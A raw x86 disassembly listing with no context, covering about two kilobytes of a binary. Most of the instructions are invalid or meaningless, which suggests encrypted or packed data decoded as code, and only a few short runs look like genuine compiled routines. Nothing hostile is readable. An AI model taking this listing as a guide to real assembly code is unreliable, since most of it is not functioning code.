  4030de:	jg     0x4030de
  4030e0:	ds pop edi
  4030e2:	push   esp
  4030e3:	push   0xfa81bbba
  4030e8:	xchg   ebp,eax
  4030e9:	xor    dl,cl
  4030eb:	push   esi
  4030ec:	inc    edx
  4030ed:	or     DWORD PTR [edi],edi
  4030ef:	sti    
  4030f0:	xchg   DWORD PTR [ebp-0x7576a508],edx
  4030f6:	les    edx,FWORD PTR [ebx+eiz*4-0x6d790f27]
  4030fd:	jnp    0x4030ab
  4030ff:	mov    dl,0x5e
  403101:	mov    bh,0xae
  403103:	pop    ebp
  403104:	jp     0x4030f7
  403106:	push   edx
  403107:	inc    edx
  403108:	adc    ah,bl
  40310a:	dec    esp
  40310b:	out    dx,al
  40310c:	pop    es
  40310d:	jnp    0x403124
  40310f:	scas   eax,DWORD PTR es:[edi]
  403110:	dec    eax
  403111:	mov    DWORD PTR [esi],ebp
  403113:	mov    dl,0xbf
  403115:	jno    0x403128
  403117:	sub    ch,BYTE PTR [edx-0x458d407a]
  40311d:	(bad)  
  40311e:	ficom  WORD PTR [esi-0x24]
  403121:	in     eax,0x92
  403123:	inc    esi
  403124:	add    esi,DWORD PTR [eax+0x542a0669]
  40312a:	add    eax,0x2f39d904
  40312f:	xor    edi,DWORD PTR ds:0x1ad828de
  403135:	lahf   
  403136:	in     al,dx
  403137:	test   eax,0x89b8c66d
  40313c:	add    DWORD PTR [ebx+0x4d8bdc45],ecx
  403142:	clc    
  403143:	mov    DWORD PTR [ecx+0x4],eax
  403146:	mov    eax,DWORD PTR [ebp-0x20]
  403149:	mov    ecx,DWORD PTR [ebp-0x8]
  40314c:	mov    DWORD PTR [ecx+0x8],eax
  40314f:	mov    eax,DWORD PTR [ebp-0x34]
  403152:	mov    ecx,DWORD PTR [ebp-0x8]
  403155:	mov    DWORD PTR [ecx+0xc],eax
  403158:	mov    eax,DWORD PTR [ebp-0x30]
  40315b:	jmp    0x403569
  403160:	mov    esi,ss
  403162:	jmp    0x4031a7
  403164:	jno    0x4031c9
  403166:	mov    ah,0xd1
  403168:	cs out 0xa4,al
  40316b:	mov    ch,0x86
  40316d:	jne    0x4031cf
  40316f:	xchg   ebx,eax
  403170:	mov    DWORD PTR ds:0x7d6f7e7e,edx
  403176:	jle    0x4031f6
  403178:	sbb    BYTE PTR [ecx+0x5e312a12],bl
  40317e:	xchg   esi,eax
  40317f:	jmp    0x4031d8
  403181:	jge    0x40315c
  403183:	and    DWORD PTR [eax+0x7f],eax
  403186:	repnz mov eax,ds:0x35a499a8
  40318c:	jmp    0x9318bb54
  403191:	cmp    BYTE PTR [eax],bh
  403193:	dec    cx
  403195:	and    ah,bl
  403197:	in     eax,0xd7
  403199:	fwait
  40319a:	hlt    
  40319b:	setae  BYTE PTR [esi]
  40319e:	pusha  
  40319f:	jmp    0x5543:0xce066bb9
  4031a6:	and    al,0xd4
  4031a8:	jp     0x4031ba
  4031aa:	(bad)  
  4031ab:	fcomi  st,st(0)
  4031ad:	sbb    BYTE PTR [edi+0x73ba1ed4],al
  4031b3:	lahf   
  4031b4:	hlt    
  4031b5:	inc    ebx
  4031b6:	es mov eax,0xa9be0c7f
  4031bc:	jle    0x4031d7
  4031be:	add    al,0x4e
  4031c0:	inc    ecx
  4031c1:	add    ch,BYTE PTR [edx]
  4031c3:	mov    al,0x72
  4031c5:	adc    al,0xa0
  4031c7:	fmul   DWORD PTR [ebx]
  4031c9:	pop    ecx
  4031ca:	fcomip st,st(4)
  4031cc:	imul   ebp,DWORD PTR [eax+0x5f5e2575],0xe9e4f79e
  4031d6:	gs push cs
  4031d8:	xchg   edi,eax
  4031d9:	mov    eax,ds:0x4776d3a4
  4031de:	in     eax,0x43
  4031e0:	cmp    eax,edx
  4031e2:	aam    0xcb
  4031e4:	xlat   BYTE PTR ds:[ebx]
  4031e5:	(bad)  
  4031e6:	shl    cl,cl
  4031e8:	loop   0x403250
  4031ea:	sbb    DWORD PTR [ecx-0x6],ebp
  4031ed:	xchg   esi,eax
  4031ee:	xlat   BYTE PTR ds:[ebx]
  4031ef:	repz xchg ecx,eax
  4031f1:	jne    0x4031cd
  4031f3:	jb     0x4031d8
  4031f5:	adc    dl,BYTE PTR [edx]
  4031f7:	and    edi,DWORD PTR [ecx+0x2f]
  4031fa:	lods   eax,DWORD PTR ds:[esi]
  4031fb:	xor    BYTE PTR [ebx+eax*4-0x736f8b27],al
  403202:	sbb    edx,DWORD PTR [ebp+0x603a3d6d]
  403208:	ss aas 
  40320a:	xchg   esp,eax
  40320b:	xor    edx,esp
  40320d:	mov    ebp,eax
  40320f:	icebp  
  403210:	sbb    edi,DWORD PTR [ebp+0x267fde7e]
  403216:	cmc    
  403217:	pop    es
  403218:	push   ebx
  403219:	mov    al,ds:0x64e6b713
  40321e:	sub    eax,0x894e0342
  403223:	cmp    ebp,DWORD PTR [ecx+0x591f097c]
  403229:	xlat   BYTE PTR ds:[ebx]
  40322a:	retf   
  40322b:	xchg   DWORD PTR [ecx-0x69e5e556],edx
  403231:	dec    eax
  403232:	mov    al,ds:0xee70e024
  403237:	jo     0x403238
  403239:	inc    esp
  40323a:	dec    eax
  40323b:	push   ebp
  40323c:	mov    bh,0xe9
  40323e:	lods   eax,DWORD PTR ds:[esi]
  40323f:	(bad)
  403243:	cli    
  403244:	jle    0x40325c
  403246:	mov    bh,0x47
  403248:	mov    ebp,0x7936dd47
  40324d:	xchg   edx,eax
  40324e:	push   esi
  40324f:	or     bh,bl
  403251:	inc    ebp
  403252:	push   cs
  403253:	xchg   esi,eax
  403254:	add    esi,eax
  403256:	jmp    0xed8d6bc2
  40325b:	cmp    BYTE PTR [ebx+0x53],ah
  40325e:	cmc    
  40325f:	ror    al,cl
  403261:	not    DWORD PTR [edi-0x72]
  403264:	ds in  eax,0xd7
  403267:	sbb    ebx,edx
  403269:	imul   ebp,DWORD PTR [edi-0x2c136bfb],0x98146434
  403273:	in     eax,dx
  403274:	jbe    0x403261
  403276:	sub    eax,0x971271d0
  40327b:	xchg   DWORD PTR [eax],ebx
  40327d:	ret    
  40327e:	loop   0x40329e
  403280:	mov    dl,0x34
  403282:	sub    cl,BYTE PTR [edx+0x50]
  403285:	in     al,0x4d
  403287:	pop    ecx
  403288:	mov    WORD PTR [esi+0x7cf18ddd],gs
  40328e:	mov    ch,0xa8
  403290:	cdq    
  403291:	cmp    ch,BYTE PTR [ebx-0xff6b787]
  403297:	xor    esi,ebx
  403299:	mov    eax,gs:0xc201b1da
  40329f:	cmc    
  4032a0:	push   ds
  4032a1:	and    BYTE PTR [ebx-0x6ef47054],dl
  4032a7:	cli    
  4032a8:	adc    DWORD PTR [bx+di+0x3b],ebp
  4032ac:	fisubr WORD PTR [ecx-0x17be5058]
  4032b2:	(bad)  
  4032b3:	rcr    BYTE PTR [edi],1
  4032b5:	imul   esp,DWORD PTR [ecx],0xc1b05592
  4032bb:	ins    BYTE PTR es:[edi],dx
  4032bc:	es mov esp,0xc5162595
  4032c2:	jmp    0x9654bacd
  4032c7:	arpl   bx,bp
  4032c9:	imul   esi,DWORD PTR [ebx+0x5b],0x0
  4032cd:	scas   al,BYTE PTR es:[edi]
  4032ce:	or     eax,0xe69d56bd
  4032d3:	adc    ecx,0xd89cf589
  4032d9:	aaa    
  4032da:	ror    BYTE PTR [edx+ebp*8],1
  4032dd:	sub    DWORD PTR [ebx+ebx*4+0x4083205b],eax
  4032e4:	xchg   edx,eax
  4032e5:	fwait
  4032e6:	dec    esi
  4032e7:	sub    BYTE PTR [ebp-0x589e4650],al
  4032ed:	(bad)  
  4032ee:	inc    edx
  4032ef:	(bad)
  4032f3:	push   0xfffffff7
  4032f5:	in     eax,dx
  4032f6:	outs   dx,DWORD PTR ds:[esi]
  4032f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032f8:	sbb    BYTE PTR [eax],ah
  4032fa:	dec    esp
  4032fb:	cld    
  4032fc:	mov    ebp,0x9892568a
  403301:	mov    edi,0x49094a3d
  403306:	pop    ss
  403307:	imul   ecx,DWORD PTR [esi-0x12],0x2c
  40330b:	test   DWORD PTR [edx+0x69],edx
  40330e:	pop    ebp
  40330f:	mov    ebp,0x436ebd28
  403314:	mov    esi,0x93a83652
  403319:	pop    ebx
  40331a:	retf   
  40331b:	popa   
  40331c:	mov    al,ds:0x9c710bea
  403321:	jl     0x403323
  403323:	ins    BYTE PTR es:[edi],dx
  403324:	xchg   esp,eax
  403325:	stc    
  403326:	add    eax,0x4347c3ae
  40332b:	enter  0x9ee2,0xcf
  40332f:	pop    edx
  403330:	in     al,0xc8
  403332:	sar    BYTE PTR [ebx],0xfd
  403335:	xor    esi,DWORD PTR ds:[edx+ecx*4]
  403339:	cmp    al,0x72
  40333b:	adc    DWORD PTR [edx+0x76],edx
  40333e:	jo     0x403393
  403340:	pop    ebx
  403341:	push   ecx
  403342:	xchg   DWORD PTR [ebp+0x51],esi
  403345:	sbb    dl,BYTE PTR [ebx]
  403347:	xlat   BYTE PTR ds:[ebx]
  403348:	fmul   QWORD PTR [esi]
  40334a:	iret   
  40334b:	gs push eax
  40334d:	sub    DWORD PTR [ecx-0x32],esp
  403350:	in     eax,0x4d
  403352:	pop    ecx
  403353:	mov    dl,0x3d
  403355:	add    al,0x8f
  403357:	cmp    dl,al
  403359:	fwait
  40335a:	dec    edi
  40335b:	fdiv   QWORD PTR [edx-0x2f]
  40335e:	push   edi
  40335f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403360:	or     ch,BYTE PTR [ebx]
  403362:	in     eax,0x1a
  403364:	inc    edx
  403365:	gs (bad) 
  403367:	mov    ds:0x331f0c58,al
  40336c:	test   eax,0x3165b3a5
  403371:	xchg   DWORD PTR [ecx+0x4b],edx
  403374:	xor    al,0xd
  403376:	dec    esi
  403377:	cmp    al,0x17
  403379:	adc    eax,0xc8522757
  40337e:	xchg   ebx,eax
  40337f:	inc    esp
  403380:	call   FWORD PTR [ecx]
  403382:	and    DWORD PTR [eax],edx
  403384:	inc    edx
  403385:	fbstp  TBYTE PTR [eax+0x28b9cbb1]
  40338b:	in     eax,dx
  40338c:	enter  0xf196,0xb1
  403390:	sbb    al,0x7e
  403392:	(bad)  
  403393:	pop    ss
  403394:	xchg   esi,eax
  403395:	maxps  xmm7,xmm2
  403398:	pop    eax
  403399:	ror    BYTE PTR [eax+0x21577000],0x27
  4033a0:	stos   BYTE PTR es:[edi],al
  4033a1:	mov    esp,DWORD PTR [edx+0x426ce57e]
  4033a7:	push   0xff295a56
  4033ac:	pop    edx
  4033ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033ae:	call   0x153a:0xdc97936a
  4033b5:	mov    esp,0x9b083cd0
  4033ba:	cmp    eax,0x72e6e086
  4033bf:	push   ecx
  4033c0:	xchg   edi,eax
  4033c1:	adc    DWORD PTR [esi-0x15c16b19],esp
  4033c7:	sbb    esp,edi
  4033c9:	jecxz  0x40339f
  4033cb:	xor    eax,0xd96f8682
  4033d0:	mov    ds:0x493b7ae1,al
  4033d5:	adc    ebx,DWORD PTR [edx]
  4033d7:	xor    DWORD PTR [eax+edi*2],edx
  4033da:	ins    BYTE PTR es:[edi],dx
  4033db:	mov    BYTE PTR [ebx-0xad589fe],ch
  4033e1:	aas    
  4033e2:	repnz leave 
  4033e4:	mov    edi,0x641a7f92
  4033e9:	(bad)
  4033ec:	jmp    0xba291681
  4033f1:	cwde   
  4033f2:	retf   0xddb8
  4033f5:	scas   eax,DWORD PTR es:[edi]
  4033f6:	xor    esp,eax
  4033f8:	(bad)  
  4033f9:	xchg   ebp,eax
  4033fa:	jb     0x4033af
  4033fc:	stos   BYTE PTR es:[edi],al
  4033fd:	fwait
  4033fe:	dec    ebp
  4033ff:	xchg   ebp,eax
  403400:	mov    dh,BYTE PTR [edx+0x62]
  403403:	iret   
  403404:	xchg   ecx,eax
  403405:	in     eax,dx
  403406:	mov    ah,0xb0
  403408:	mov    cl,0xb2
  40340a:	adc    DWORD PTR [eax+0x49855e37],eax
  403410:	imul   ecx,DWORD PTR [esi-0x5a15ae12],0x2b
  403417:	push   eax
  403418:	xor    eax,0x60b44a52
  40341d:	cmp    BYTE PTR [edi-0x79c8ed5b],al
  403423:	jb     0x403459
  403425:	or     edi,DWORD PTR [ecx-0x10e61da5]
  40342b:	out    0x61,eax
  40342d:	rcr    BYTE PTR ds:[ecx-0x76],cl
  403431:	mov    ecx,0x999c8d2a
  403436:	push   ss
  403437:	push   0xfffffff0
  403439:	jne    0x403405
  40343b:	in     al,dx
  40343c:	jne    0x40341f
  40343e:	mov    ebx,0x1941ead2
  403443:	dec    eax
  403444:	icebp  
  403445:	jne    0x4033fc
  403447:	xlat   BYTE PTR ds:[ebx]
  403448:	mov    DWORD PTR ss:[ecx-0x41dc2500],esp
  40344f:	or     ebx,edi
  403451:	retf   
  403452:	neg    BYTE PTR [ebx-0x52d70565]
  403458:	fs jg  0x403447
  40345b:	pop    ecx
  40345c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40345d:	xchg   edx,eax
  40345e:	mov    dh,0x91
  403460:	xchg   edi,eax
  403461:	rol    BYTE PTR [edx-0x2cd80735],cl
  403467:	mov    ecx,0x40f0bf9d
  40346c:	cld    
  40346d:	cmp    eax,0xa3c45aa
  403472:	imul   edx,esp,0xff224798
  403478:	or     DWORD PTR [ebx+ecx*1+0x3cc65110],ebp
  40347f:	scas   al,BYTE PTR es:[edi]
  403480:	ror    BYTE PTR [ecx+ebp*8],0x9e
  403484:	push   edi
  403485:	xchg   DWORD PTR [edi+edi*2+0x27dcc069],esi
  40348c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40348d:	jb     0x403434
  40348f:	cmp    dh,BYTE PTR [ecx+0x6d]
  403492:	scas   eax,DWORD PTR es:[edi]
  403493:	push   ds
  403494:	push   gs
  403496:	and    al,0xe3
  403498:	enter  0xa8a6,0xdb
  40349c:	jae    0x4034ff
  40349e:	dec    esi
  40349f:	repz jo 0x403512
  4034a2:	out    0x78,al
  4034a4:	cmp    dl,BYTE PTR [ecx-0x3c]
  4034a7:	lods   eax,DWORD PTR ds:[esi]
  4034a8:	inc    ebp
  4034a9:	sub    cl,BYTE PTR [ecx-0x74]
  4034ac:	cmc    
  4034ad:	loopne 0x4034fc
  4034af:	jg     0x403483
  4034b1:	sub    esi,esp
  4034b3:	mov    edi,DWORD PTR [ecx+0x4148b2bb]
  4034b9:	jo     0x4034fb
  4034bb:	xor    eax,0x95dd1b02
  4034c0:	xchg   ecx,eax
  4034c1:	pop    ax
  4034c3:	or     edx,eax
  4034c5:	retf   
  4034c6:	dec    ebx
  4034c7:	sub    eax,0x312e7af9
  4034cc:	sbb    al,0xc6
  4034ce:	pop    es
  4034cf:	retf   0xa598
  4034d2:	adc    esp,DWORD PTR [ebx+0x2b30dfb9]
  4034d8:	pop    ecx
  4034d9:	fldenv [edx-0x3f05d56a]
  4034df:	pusha  
  4034e0:	mov    ds:0x4a3f99eb,eax
  4034e5:	inc    ebx
  4034e6:	add    bl,BYTE PTR [eax-0x7a]
  4034e9:	leave  
  4034ea:	or     eax,0x5f0a111
  4034ef:	mov    ds:0x89643b58,al
  4034f4:	pop    ds
  4034f5:	push   eax
  4034f6:	mov    dh,al
  4034f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034f9:	adc    bh,BYTE PTR [edi]
  4034fb:	lods   eax,DWORD PTR ds:[esi]
  4034fc:	push   edx
  4034fd:	adc    cl,ch
  4034ff:	imul   BYTE PTR [ebp+0x71]
  403502:	mov    edx,0x5ad78c9a
  403507:	jno    0x40354c
  403509:	fist   WORD PTR [edi-0x68]
  40350c:	cmp    DWORD PTR [eax],ebp
  40350e:	icebp  
  40350f:	push   edi
  403510:	inc    esp
  403511:	aaa    
  403512:	pop    ebx
  403513:	pop    edx
  403514:	lds    eax,FWORD PTR [eax]
  403516:	in     eax,dx
  403517:	xlat   BYTE PTR ds:[ebx]
  403518:	in     eax,dx
  403519:	(bad)  
  40351a:	fs (bad) 
  40351c:	inc    eax
  40351d:	mov    esp,0x275f8eed
  403522:	repnz mov ecx,0xd14ca239
  403528:	jl     0x403522
  40352a:	xchg   ebp,eax
  40352b:	pop    es
  40352c:	jp     0x4035ac
  40352e:	xor    eax,0x45c727ec
  403533:	cmp    dl,0x88
  403536:	push   es
  403537:	ss retf 0xe597
  40353b:	loopne 0x403593
  40353d:	pop    ss
  40353e:	ja     0x4035ba
  403540:	add    BYTE PTR [eax+0x862a748],dh
  403546:	xor    BYTE PTR [ecx],ch
  403548:	pusha  
  403549:	call   0xb2a7c3af
  40354e:	and    eax,edx
  403550:	dec    eax
  403551:	dec    eax
  403552:	rcr    BYTE PTR ds:0xa835554,1
  403558:	mov    esi,0xddeb20c8
  40355d:	mov    al,0x87
  40355f:	dec    ebx
  403560:	outs   dx,DWORD PTR gs:[esi]
  403562:	adc    eax,0xe1df7
  403567:	icebp  
  403568:	out    0x8b,eax
  40356a:	dec    ebp
  40356b:	clc    
  40356c:	mov    DWORD PTR [ecx+0x10],eax
  40356f:	mov    eax,eax
  403571:	mov    eax,DWORD PTR [ebp-0x24]
  403574:	test   eax,eax
  403576:	mov    eax,DWORD PTR [ebp-0x2c]
  403579:	jne    0x403582
  40357f:	mov    eax,DWORD PTR [ebp-0x10]
  403582:	xor    eax,esi
  403584:	add    eax,edi
  403586:	jmp    0x403994
  40358b:	in     eax,dx
  40358c:	adc    ch,ch
  40358e:	ret    0xe3f1
  403591:	icebp  
  403592:	xor    DWORD PTR [eax],ebx
  403594:	xchg   esi,eax
  403595:	sbb    esp,edx
  403597:	pushf  
  403598:	fwait
  403599:	mov    eax,ds:0x7e118637
  40359e:	jle    0x40360f
  4035a0:	jge    0x403620
  4035a2:	jle    0x40354e
  4035a4:	or     BYTE PTR [edx+eiz*8-0x5b],dl
  4035a8:	xor    ebx,DWORD PTR [eax]
  4035aa:	or     dl,BYTE PTR [edi-0x6a]
  4035ad:	mov    edx,0xc63d865f
  4035b2:	mov    cl,0xff
  4035b4:	ret    
  4035b5:	jl     0x4035de
  4035b7:	sbb    DWORD PTR [esi],ecx
  4035b9:	out    dx,al
  4035ba:	leave  
  4035bb:	xor    cl,BYTE PTR [eax-0x66c6b9ef]
  4035c1:	adc    bl,BYTE PTR [ebp+0x77eaba0a]
  4035c7:	add    DWORD PTR [bx-0x57ba],ebp
  4035cc:	or     DWORD PTR [eax],0xc36351f2
  4035d2:	or     al,0xba
  4035d4:	vsubpd xmm5,xmm7,XMMWORD PTR [edi+0x4e]
  4035d9:	out    0x41,eax
  4035db:	and    al,0x80
  4035dd:	into   
  4035de:	dec    ebp
  4035df:	adc    ah,ch
  4035e1:	push   edx
  4035e2:	xor    DWORD PTR [ecx+0x0],ebx
  4035e5:	jg     0x40360e
  4035e7:	mov    ebx,0x2a2ba85f
  4035ec:	and    al,0xea
  4035ee:	cdq    
  4035ef:	dec    ecx
  4035f0:	sbb    BYTE PTR [esi+0x3dcb182e],dl
  4035f6:	clc    
  4035f7:	shl    DWORD PTR [edx-0x5e],1
  4035fa:	xchg   esi,eax
  4035fb:	jo     0x4035d4
  4035fd:	xchg   ecx,eax
  4035fe:	icebp  
  4035ff:	add    edi,DWORD PTR [edi-0x416987c2]
  403605:	jmp    0x1c9d7e23
  40360a:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40360c:	nop
  40360d:	(bad)  
  40360e:	mov    ah,0xe4
  403610:	mov    ebx,0xb616e400
  403615:	adc    DWORD PTR [esi-0x20],edi
  403618:	sub    al,0xf2
  40361a:	imul   esp,DWORD PTR [edx-0x846570a],0xcac0d026
  403624:	fadd   QWORD PTR [edi+esi*4-0x779088af]
  40362b:	inc    eax
  40362c:	aam    0x3a
  40362e:	fwait
  40362f:	stos   BYTE PTR es:[edi],al
  403630:	push   ds
  403631:	call   0x13cc99e2
  403636:	jge    0x4035c5
  403638:	out    dx,al
  403639:	lock neg BYTE PTR [eax]
  40363c:	and    DWORD PTR [eax+0x5d34b09f],edx
  403642:	push   ecx
  403643:	mov    eax,0x900bcdd8
  403648:	jae    0x403651
  40364a:	addr16 inc ecx
  40364c:	bound  esp,QWORD PTR [ecx-0x345a5f7a]
  403652:	xor    edi,0xe
  403655:	dec    ebx
  403656:	jmp    0xe24519a9
  40365b:	das    
  40365c:	cs test edi,ecx
  40365f:	adc    BYTE PTR [ecx-0x5d],bh
  403662:	je     0x403612
  403664:	pop    esp
  403665:	mov    edi,0x9fbb1171
  40366a:	xchg   ebp,eax
  40366b:	(bad)  
  40366c:	fs add eax,0xbab5fc1a
  403672:	or     bh,ah
  403674:	je     0x403628
  403676:	xor    ebx,edi
  403678:	mov    ebx,0xf8f7b6ec
  40367d:	mov    ebx,DWORD PTR [edi+ebx*1]
  403680:	push   0x8bff48b0
  403685:	jg     0x403669
  403687:	mov    ebp,0xbebdfaa
  40368c:	push   esp
  40368d:	cmc    
  40368e:	int3   
  40368f:	retf   
  403690:	xchg   BYTE PTR [ecx+0x5],cl
  403693:	fsub   QWORD PTR ds:0xdbb6ad3e
  403699:	test   eax,0x8435bd92
  40369e:	int3   
  40369f:	adc    al,0xa4
  4036a1:	pop    esi
  4036a2:	mov    bh,0xa3
  4036a4:	cwde   
  4036a5:	test   DWORD PTR [esi+0x289b6384],edx
  4036ab:	popa   
  4036ac:	jmp    0xc2bc:0x35c6777e
  4036b3:	out    0x79,eax
  4036b5:	scas   eax,DWORD PTR es:[edi]
  4036b6:	add    BYTE PTR [eax-0x3],0x3d
  4036ba:	(bad)  
  4036bb:	sbb    edx,eax
  4036bd:	jl     0x4036a7
  4036bf:	jmp    0x4036cd
  4036c1:	sub    al,0xd4
  4036c3:	dec    ecx
  4036c4:	push   es
  4036c5:	repz pop esp
  4036c7:	xor    esi,DWORD PTR [edi-0x3fc285d0]
  4036cd:	(bad)  
  4036ce:	rcl    BYTE PTR [esi+0x32],1
  4036d1:	xchg   ebp,eax
  4036d2:	cmp    DWORD PTR [ecx-0x27640732],0xffffffd1
  4036d9:	outs   dx,BYTE PTR ds:[esi]
  4036da:	mov    ss,WORD PTR [esi-0xb]
  4036dd:	mov    ah,0x76
  4036df:	mov    dh,0x27
  4036e1:	push   esi
  4036e2:	cs enter 0xf332,0x7e
  4036e7:	pop    ebx
  4036e8:	ffree  st(0)
  4036ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036eb:	sbb    al,0xf
  4036ed:	mov    edi,0x83263a37
  4036f2:	popa   
  4036f3:	pop    edi
  4036f4:	push   es
  4036f5:	cmp    BYTE PTR [esi+0x2b],dl
  4036f8:	stc    
  4036f9:	dec    edi
  4036fa:	xlat   BYTE PTR ds:[ebx]
  4036fb:	adc    ebp,edx
  4036fd:	and    bl,BYTE PTR [eax+0x4c0b4257]
  403703:	mov    esi,0x9b8859b5
  403709:	sub    bl,BYTE PTR [edi-0x18367a13]
  40370f:	ftst   
  403711:	jle    0x40377b
  403713:	aam    0x4
  403715:	or     al,0x81
  403717:	inc    eax
  403718:	push   cs
  403719:	dec    edi
  40371a:	test   eax,0x4dda8b4c
  40371f:	mov    edx,0xdf50fc23
  403724:	jecxz  0x4036c9
  403726:	js     0x40374b
  403728:	in     al,dx
  403729:	(bad)  
  40372a:	jae    0x40376e
  40372c:	dec    edi
  40372d:	mov    ebp,0x3d3c366e
  403732:	fdivr  st,st(0)
  403734:	sub    ecx,DWORD PTR [esi+ebp*1]
  403737:	ins    BYTE PTR es:[edi],dx
  403738:	inc    eax
  403739:	leave  
  40373a:	adc    ebp,esi
  40373c:	sub    al,0xdc
  40373e:	call   0xf6c96ae9
  403743:	cmp    BYTE PTR ds:0xb9d8fbb5,cl
  403749:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40374a:	ins    BYTE PTR es:[edi],dx
  40374b:	imul   edi,DWORD PTR [ebx],0xa0b838f4
  403751:	or     al,0x46
  403753:	test   cl,0xa
  403756:	(bad)  
  403757:	mov    edi,0xdeec475e
  40375c:	leave  
  40375d:	mov    ebp,0xff61bd74
  403762:	in     al,0x4c
  403764:	je     0x4036fc
  403766:	dec    esp
  403767:	dec    eax
  403768:	jnp    0x403703
  40376a:	dec    eax
  40376b:	cmp    BYTE PTR [ebx+0x50ac5a4b],dl
  403771:	aas    
  403772:	dec    esi
  403773:	lea    ecx,[eax-0x7c]
  403776:	jae    0x403726
  403778:	popf   
  403779:	mov    al,ds:0x9b7bcc80
  40377e:	std    
  40377f:	push   0xffffffb5
  403781:	aad    0xbe
  403783:	sbb    dh,BYTE PTR [ecx-0x19159523]
  403789:	pop    eax
  40378a:	aaa    
  40378b:	jmp    0x403710
  40378d:	sahf   
  40378e:	cmp    dl,ch
  403790:	xchg   esp,eax
  403791:	(bad)  
  403792:	xchg   edx,eax
  403793:	ret    
  403794:	mov    bh,0x80
  403796:	and    eax,0x1c2b866
  40379b:	in     al,dx
  40379c:	push   cs
  40379d:	lock sbb cl,BYTE PTR [esi]
  4037a0:	mov    eax,ds:0xc8b1a62c
  4037a5:	xchg   ecx,eax
  4037a6:	add    bl,BYTE PTR [ebx]
  4037a8:	arpl   di,si
  4037aa:	lahf   
  4037ab:	inc    ecx
  4037ac:	test   BYTE PTR [edx-0x20],ch
  4037af:	adc    DWORD PTR [ebx+0xd],ebp
  4037b2:	push   edx
  4037b3:	jge    0x403745
  4037b5:	adc    eax,DWORD PTR [edx]
  4037b7:	jge    0x40381d
  4037b9:	shl    bh,1
  4037bb:	cld    
  4037bc:	sub    ebp,DWORD PTR [ebx-0x346c4688]
  4037c2:	add    eax,DWORD PTR [ebp+0x41]
  4037c5:	mov    esp,0xd03dd36f
  4037ca:	retf   0x32f2
  4037cd:	gs push 0xd757dba4
  4037d3:	xlat   BYTE PTR ds:[ebx]
  4037d4:	std    
  4037d5:	pushf  
  4037d6:	adc    al,BYTE PTR [edx-0x60]
  4037d9:	mov    al,0xa5
  4037db:	add    cl,ch
  4037dd:	ss push esi
  4037df:	push   ebp
  4037e0:	dec    esi
  4037e1:	sbb    al,0x2b
  4037e3:	mov    ?,WORD PTR [ebx+0x42861172]
  4037e9:	xchg   ecx,eax
  4037ea:	scas   al,BYTE PTR es:[edi]
  4037eb:	dec    esp
  4037ec:	push   ebx
  4037ed:	pusha  
  4037ee:	mov    ds:0x626d75ad,al
  4037f3:	mov    eax,ds:0x167282ed
  4037f8:	sub    DWORD PTR [ebx],edx
  4037fa:	popf   
  4037fb:	nop
  4037fc:	mov    ebp,0xb78a4b61
  403801:	in     al,dx
  403802:	stos   DWORD PTR es:[edi],eax
  403803:	ins    DWORD PTR es:[edi],dx
  403804:	cli    
  403805:	mov    fs,WORD PTR [esi+0x3e]
  403808:	retf   
  403809:	mov    ebp,0xd1b82c36
  40380e:	sahf   
  40380f:	jb     0x4037f7
  403811:	mov    eax,0x806a0329
  403816:	out    dx,eax
  403817:	cwde   
  403818:	xor    dh,BYTE PTR [ecx+0x4f]
  40381b:	data16 fistp QWORD PTR [ebx+edi*4]
  40381f:	mov    ebx,0xe10adce1
  403824:	jbe    0x4037c0
  403826:	in     al,0x71
  403828:	jmp    0x403837
  40382a:	jg     0x4037d5
  40382c:	daa    
  40382d:	cld    
  40382e:	sub    bh,BYTE PTR [esi]
  403830:	mov    ebx,0x3f88724f
  403835:	xlat   BYTE PTR ds:[ebx]
  403836:	push   ds
  403837:	mov    al,ds:0xeeebb804
  40383c:	sti    
  40383d:	inc    esp
  40383e:	jl     0x4038aa
  403840:	mov    dh,0xcf
  403842:	out    dx,al
  403843:	ins    DWORD PTR es:[edi],dx
  403844:	ftst   
  403846:	test   eax,0x1c4d69
  40384b:	shl    DWORD PTR [esi-0x4cefee3f],1
  403851:	inc    eax
  403852:	sub    ah,BYTE PTR [ebx+0x65]
  403855:	jge    0x4037e1
  403857:	fcomp  DWORD PTR [esi-0x5b]
  40385a:	loopne 0x40382f
  40385c:	push   edx
  40385d:	and    dh,ch
  40385f:	lods   al,BYTE PTR ds:[esi]
  403860:	jae    0x403822
  403862:	dec    eax
  403863:	popf   
  403864:	call   0xc0e9:0x8ce49975
  40386b:	mov    dh,0xa5
  40386d:	jnp    0x4038d4
  40386f:	cwde   
  403870:	scas   eax,DWORD PTR es:[edi]
  403871:	and    DWORD PTR [ebx+esi*8],esp
  403874:	xchg   ecx,eax
  403875:	cmp    ch,dh
  403877:	jb     0x4037ff
  403879:	cmp    al,0x8e
  40387b:	std    
  40387c:	mov    bh,0x1e
  40387e:	xlat   BYTE PTR ds:[ebx]
  40387f:	fbld   TBYTE PTR [ebp+eax*4+0x4b03afb5]
  403886:	or     BYTE PTR [esi],ah
  403888:	sti    
  403889:	lahf   
  40388a:	mov    edx,DWORD PTR [ecx+0x51]
  40388d:	adc    al,0x27
  40388f:	sti    
  403890:	out    dx,eax
  403891:	adc    DWORD PTR [ecx+0x8a5ac58],ebp
  403897:	inc    ecx
  403898:	fisttp DWORD PTR [eax]
  40389a:	icebp  
  40389b:	and    DWORD PTR [eax+0xb],ebp
  40389e:	(bad)  
  40389f:	cmp    DWORD PTR [edx],ebx
  4038a1:	aad    0x16
  4038a3:	or     eax,0x7805b86b
  4038a8:	mov    DWORD PTR [eax],eax
  4038aa:	shl    cl,0xd7
  4038ad:	in     al,dx
  4038ae:	gs push 0x39
  4038b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038b2:	mov    ch,0xd4
  4038b4:	(bad)  
  4038b5:	fimul  DWORD PTR ds:0x6273bfb5
  4038bb:	inc    eax
  4038bc:	xlat   BYTE PTR ds:[ebx]
  4038bd:	xor    eax,0xc3a1219c
  4038c2:	inc    esp
